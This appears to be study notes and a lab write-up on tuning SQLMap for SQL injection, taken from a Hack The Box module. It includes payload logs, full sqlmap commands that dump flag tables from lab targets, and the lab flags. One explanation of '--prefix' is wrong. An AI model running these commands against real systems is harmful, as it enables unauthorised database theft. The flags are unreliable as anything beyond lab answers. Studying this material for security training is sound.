In most cases, SQLMap should run out of the box with the provided target details. Nevertheless, there are options to fine-tune the SQLi injection attempts to help SQLMap in the detection phase. Every payload sent to the target consists of:

- vector (e.g.,`UNION ALL SELECT 1,2,VERSION()`): central part of the payload, carrying the useful SQL code to be executed at the target.
 
- boundaries (e.g.`'<vector>-- -`): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.
 

---

## Prefix/Suffix

There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run. 
For such runs, options`--prefix` and`--suffix` can be used as follows:


```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

This will result in an enclosure of all vector values between the static prefix`%'))` and the suffix`-- -`. 
For example, if the vulnerable code at the target is:

```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

The vector`UNION ALL SELECT 1,2,VERSION()`, bounded with the prefix`%'))` and the suffix`-- -`, will result in the following (valid) SQL statement at the target:


```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

---

## Level/Risk

By default, SQLMap combines a predefined set of most common boundaries (i.e., prefix/suffix pairs), along with the vectors having a high chance of success in case of a vulnerable target. Nevertheless, there is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.

For such demands, the options`--level` and`--risk` should be used:

- The option`--level` (`1-5`, default`1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
 
- The option`--risk` (`1-3`, default`1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).
 

The best way to check for differences between used boundaries and payloads for different values of`--level` and`--risk`, is the usage of`-v` option to set the verbosity level. In verbosity 3 or higher (e.g.`-v 3`), messages containing the used`[PAYLOAD]` will be displayed, as follows:


```shell-session
smoothment@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5

...SNIP...
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236
...SNIP...
[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs
[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
...SNIP...
[14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye
[14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj
[14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB
...SNIP...
[14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1
[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
```

On the other hand, payloads used with the default`--level` value have a considerably smaller set of boundaries:

```shell-session
smoothment@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3
...SNIP...
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
[14:20:36] [PAYLOAD] 1 AND 7496=4313
[14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN
[14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz
[14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
```

As for vectors, we can compare used payloads as follows:

```shell-session
smoothment@htb[/htb]$ sqlmap -u www.example.com/?id=1
...SNIP...
[14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
...SNIP...
```

```shell-session
smoothment@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3

...SNIP...
[14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
...SNIP...
[14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
...SNIP...
[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
...SNIP...
[14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[14:46:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[14:46:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
...SNIP...
```

As for the number of payloads, by default (i.e.`--level=1 --risk=1`), the number of payloads used for testing a single parameter goes up to 72, while in the most detailed case (`--level=5 --risk=3`) the number of payloads increases to 7,865.

As SQLMap is already tuned to check for the most common boundaries and vectors, regular users are advised not to touch these options because it will make the whole detection process considerably slower. Nevertheless, in special cases of SQLi vulnerabilities, where usage of`OR` payloads is a must (e.g., in case of`login` pages), we may have to raise the risk level ourselves.

This is because`OR` payloads are inherently dangerous in a default run, where underlying vulnerable SQL statements (although less commonly) are actively modifying the database content (e.g.`DELETE` or`UPDATE`).

---

## Advanced Tuning

To further fine-tune the detection mechanism, there is a hefty set of switches and options. In regular cases, SQLMap will not require its usage. Still, we need to be familiar with them so that we could use them when needed.

#### Status Codes

For example, when dealing with a huge target response with a lot of dynamic content, subtle differences between`TRUE` and`FALSE` responses could be used for detection purposes. If the difference between`TRUE` and`FALSE` responses can be seen in the HTTP codes (e.g.`200` for`TRUE` and`500` for`FALSE`), the option`--code` could be used to fixate the detection of`TRUE` responses to a specific HTTP code (e.g.`--code=200`).

#### Titles

If the difference between responses can be seen by inspecting the HTTP page titles, the switch`--titles` could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag`<title>`.

#### Strings

In case of a specific string value appearing in`TRUE` responses (e.g.`success`), while absent in`FALSE` responses, the option`--string` could be used to fixate the detection based only on the appearance of that single value (e.g.`--string=success`).

#### Text-only

When dealing with a lot of hidden content, such as certain HTML page behaviors tags (e.g.`<script>`,`<style>`,`<meta>`, etc.), we can use the`--text-only` switch, which removes all the HTML tags, and bases the comparison only on the textual (i.e., visible) content.

#### Techniques

In some special cases, we have to narrow down the used payloads only to a certain type. For example, if the time-based blind payloads are causing trouble in the form of response timeouts, or if we want to force the usage of a specific SQLi payload type, the option`--technique` can specify the SQLi technique to be used.

For example, if we want to skip the time-based blind and stacking SQLi payloads and only test for the boolean-based blind, error-based, and UNION-query payloads, we can specify these techniques with`--technique=BEU`.

#### UNION SQLi Tuning

In some cases,`UNION` SQLi payloads require extra user-provided information to work. If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the option`--union-cols` (e.g.`--union-cols=17`). In case that the default "dummy" filling values used by SQLMap -`NULL` and random integer- are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead (e.g.`--union-char='a'`).

Furthermore, in case there is a requirement to use an appendix at the end of a`UNION` query in the form of the`FROM <table>` (e.g., in case of Oracle), we can set it with the option`--union-from` (e.g.`--union-from=users`). 
Failing to use the proper`FROM` appendix automatically could be due to the inability to detect the DBMS name before its usage.


# Questions
---

![Pasted image 20250204155850.png](../../../../IMAGES/Pasted%20image%2020250204155850.png)

## Case 5
---

![Pasted image 20250204160030.png](../../../../IMAGES/Pasted%20image%2020250204160030.png)

Let's send the request and save it:

```
GET /case5.php?id=1 HTTP/1.1

Host: 94.237.61.252:35591

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: keep-alive

Referer: http://94.237.61.252:35591/case5.php

Upgrade-Insecure-Requests: 1

Priority: u=0, i

```

If we try sending the standard sqlmap command, we get the following:

```
[21:01:19] [INFO] parsing HTTP request from 'case5.txt'
[21:01:19] [INFO] testing connection to the target URL
[21:01:20] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:01:20] [INFO] testing if the target URL content is stable
[21:01:20] [INFO] target URL content is stable
[21:01:20] [INFO] testing if GET parameter 'id' is dynamic
[21:01:21] [INFO] GET parameter 'id' appears to be dynamic
[21:01:21] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[21:01:22] [INFO] testing for SQL injection on GET parameter 'id'
[21:01:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:01:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[21:01:25] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[21:01:25] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[21:01:25] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')
[21:01:26] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[21:01:28] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[21:01:29] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[21:01:31] [INFO] testing 'Generic inline queries'
[21:01:31] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[21:01:32] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[21:01:32] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
[21:01:33] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[21:01:34] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[21:01:35] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[21:01:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:01:38] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[21:01:40] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[21:01:41] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[21:01:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[21:01:44] [WARNING] GET parameter 'id' does not seem to be injectable
[21:01:44] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
```


We need to use the following command instead:

```
python3 sqlmap.py -r case5.txt --batch --dump -T flag5 -D testdb --no-cast --dbms=MySQL --technique=T --time-sec=10 --level=5 --risk=3 --fresh-queries
```

```ad-important
#### Breakdown of the command
---

|**Option**|**Purpose**|
|---|---|
|`-r case5.txt`|Load the HTTP request from`case5.txt` (e.g., a captured request from Burp Suite or browser).|
|`--batch`|Run in non-interactive mode (automatically selects default options without user input).|
|`--dump`|Dump the contents of the specified table (`-T flag5`).|
|`-T flag5`|Target the table named`flag5`.|
|`-D testdb`|Target the database named`testdb`.|
|`--no-cast`|Disable payload casting (e.g., treat all data as strings). Useful if the database returns data in unexpected formats.|
|`--dbms=MySQL`|Force SQLMap to treat the backend DBMS as **MySQL**. Speeds up detection/exploitation.|
|`--technique=T`|Use **time-based blind SQL injection** (slower but effective when other techniques fail).|
|`--time-sec=10`|Set the delay for time-based injections to **10 seconds** (default: 5). Used to bypass WAFs or handle slow responses.|
|`--level=5`|Set the **test level to 5** (max: 5). Enables advanced tests (e.g., testing`Host` header for SQLi).|
|`--risk=3`|Set the **risk level to 3** (max: 3). Enables riskier payloads (e.g., heavy`OR`-based queries).|
|`--fresh-queries`|Ignore cached/stored query results. Forces SQLMap to re-run queries (useful if previous runs failed).|

```

After a long wait, we get the following:

```
Database: testdb
Table: flag5
[1 entry]
+----+---------------------------------+
| id | content |
+----+---------------------------------+
| 1 | HTB{700_much_r15k_bu7_w0r7h_17} |
+----+---------------------------------+
```

## Case 6
---
![Pasted image 20250204162741.png](../../../../IMAGES/Pasted%20image%2020250204162741.png)

Do the same as before, we can do the following command:

```
python3 sqlmap.py -r case6.txt --batch --dump -T flag6 -D testdb --no-cast --level=5 --risk=3 --prefix='`)'
```

The `-prefix` flag allows us to specify a prefix to prepend to the extracted data.

We get the following output:

```
Database: testdb
Table: flag6
[1 entry]
+----+----------------------------------+
| id | content |
+----+----------------------------------+
| 1 | HTB{v1nc3_mcm4h0n_15_4570n15h3d} |
+----+----------------------------------+
```

Flag is `HTB{v1nc3_mcm4h0n_15_4570n15h3d}`

## Case 7
---

![Pasted image 20250204162749.png](../../../../IMAGES/Pasted%20image%2020250204162749.png)

For case 7, we do the following:

```
python3 sqlmap.py -r case7.txt --batch --dump -T flag7 -D testdb --no-cast --level=5 --risk=3 --union-cols=5 --dbms=MySQL
```

Since this case is about UNION SQLI, we need to use the `--union-cols` flag to specify the number of columns to be used during the SQLI, if we set this flag to 5, we are telling sqlmap that the vulnerable query returns 5 columns.

We get the following:

```
atabase: testdb
Table: flag7
[1 entry]
+----+-----------------------+
| id | content |
+----+-----------------------+
| 1 | HTB{un173_7h3_un173d} |
+----+-----------------------+
```

Flag is `HTB{un173_7h3_un173d}`
